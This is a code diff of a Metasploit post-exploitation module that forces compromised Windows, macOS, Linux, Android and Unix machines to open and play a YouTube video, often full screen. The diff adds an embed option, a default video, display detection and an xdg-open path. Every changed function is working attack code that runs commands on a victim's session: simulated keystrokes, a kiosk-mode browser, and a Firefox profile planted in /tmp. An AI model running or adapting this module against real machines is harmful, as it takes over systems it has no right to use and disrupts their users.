@@ -6,37 +6,51 @@
 class MetasploitModule < Msf::Post
   include Msf::Post::File
 
-  PLAY_OPTIONS = 'autoplay=1&loop=1&disablekb=1&modestbranding=1&iv_load_policy=3&controls=0&showinfo=0&rel=0'
-
   def initialize(info={})
     super( update_info( info,
       'Name'          => 'Multi Manage YouTube Broadcast',
       'Description'   => %q{
         This module will broadcast a YouTube video on specified compromised systems. It will play
-        the video in the target machine's native browser in full screen mode. The VID datastore
-        option is the "v" parameter in a YouTube video's URL.
+        the video in the target machine's native browser. The VID datastore option is the "v"
+        parameter in a YouTube video's URL.
+
+        Enabling the EMBED option will play the video in full screen mode through a clean interface
+        but is not compatible with all videos.
+
+        This module will create a custom profile for Firefox on Linux systems in the /tmp directory.
       },
       'License'       => MSF_LICENSE,
-      'Author'        => [ 'sinn3r'],
-      'Platform'      => [ 'win', 'osx', 'linux', 'android' ],
-      'SessionTypes'  => [ 'shell', 'meterpreter' ]
+      'Author'        => [ 'sinn3r' ],
+      'Platform'      => [ 'win', 'osx', 'linux', 'android', 'unix' ],
+      'SessionTypes'  => [ 'shell', 'meterpreter' ],
+      'Notes'         =>
+        {
+          # ARTIFACTS_ON_DISK when the platform is linux
+          'SideEffects' => [ ARTIFACTS_ON_DISK, AUDIO_EFFECTS, SCREEN_EFFECTS ]
+        },
     ))
 
     register_options(
       [
-        OptString.new('VID', [true, 'The video ID to the YouTube video'])
+        OptBool.new('EMBED', [true, 'Use the embed version of the YouTube URL', true]),
+        OptString.new('VID', [true, 'The video ID to the YouTube video', 'kxopViU98Xo'])
       ])
   end
 
-  YOUTUBE_BASE_URL = "https://youtube.com/embed/"
+  def youtube_url
+    if datastore['EMBED']
+      "https://youtube.com/embed/#{datastore['VID']}?autoplay=1&loop=1&disablekb=1&modestbranding=1&iv_load_policy=3&controls=0&showinfo=0&rel=0"
+    else
+      "https://youtube.com/watch?v=#{datastore['VID']}"
+    end
+  end
 
   #
   # The OSX version uses an apple script to do this
   #
-  def osx_start_video(id)
-    url = "#{YOUTUBE_BASE_URL}#{id}?#{PLAY_OPTIONS}"
+  def osx_start_video(_id)
     script = ''
-    script << %Q|osascript -e 'tell application "Safari" to open location "#{url}"' |
+    script << %Q|osascript -e 'tell application "Safari" to open location "#{youtube_url}"' |
     script << %Q|-e 'activate application "Safari"' |
     script << %Q|-e 'tell application "System Events" to key code {59, 55, 3}'|
 
@@ -52,10 +66,10 @@ class MetasploitModule < Msf::Post
   #
   # The Windows version uses the "embed" player to make sure IE won't download the SWF as an object
   #
-  def win_start_video(id)
+  def win_start_video(_id)
     iexplore_path = "C:\\Program Files\\Internet Explorer\\iexplore.exe"
     begin
-      session.sys.process.execute(iexplore_path, "-k #{YOUTUBE_BASE_URL}#{id}?#{PLAY_OPTIONS}")
+      session.sys.process.execute(iexplore_path, "-k #{youtube_url}")
     rescue Rex::Post::Meterpreter::RequestError
       return false
     end
@@ -68,11 +82,13 @@ class MetasploitModule < Msf::Post
   # The Linux version uses Firefox
   # TODO: Try xdg-open?
   #
-  def linux_start_video(id)
+  def linux_start_video(_id)
     begin
       # Create a profile
       profile_name = Rex::Text.rand_text_alpha(8)
-      o = cmd_exec(%Q|firefox --display :0 -CreateProfile "#{profile_name} /tmp/#{profile_name}"|)
+      display = get_env('DISPLAY') || ':0'
+      vprint_status("Creating profile #{profile_name} using display #{display}")
+      o = cmd_exec(%Q|firefox --display #{display} -CreateProfile "#{profile_name} /tmp/#{profile_name}"|)
 
       # Add user-defined settings to profile
       s = %Q|
@@ -82,9 +98,8 @@ class MetasploitModule < Msf::Post
       write_file("/tmp/#{profile_name}/prefs.js", s)
 
       # Start the video
-      url = "#{YOUTUBE_BASE_URL}#{id}?#{PLAY_OPTIONS}"
-      data_js = %Q|"data:text/html,<script>window.open('#{url}','','width:100000px;height:100000px');</script>"|
-      joe = "firefox --display :0 -p #{profile_name} #{data_js} &"
+      data_js = %Q|"data:text/html,<script>window.open('#{youtube_url}','','width:100000px;height:100000px');</script>"|
+      joe = "firefox --display #{display} -p #{profile_name} #{data_js} &"
       cmd_exec("/bin/sh -c #{joe.shellescape}")
     rescue EOFError
       return false
@@ -106,6 +121,14 @@ class MetasploitModule < Msf::Post
     true
   end
 
+  # The generic Unix version calls xdg-open(1) or open(1)
+  def unix_start_video(_id)
+    cmd_exec("xdg-open '#{youtube_url}' || open '#{youtube_url}'")
+    true
+  rescue EOFError
+    false
+  end
+
   def start_video(id)
     case session.platform
     when 'osx'
@@ -116,6 +139,8 @@ class MetasploitModule < Msf::Post
       linux_start_video(id)
     when 'android'
       android_start_video(id)
+    when 'unix'
+      unix_start_video(id)
     end
   end
 
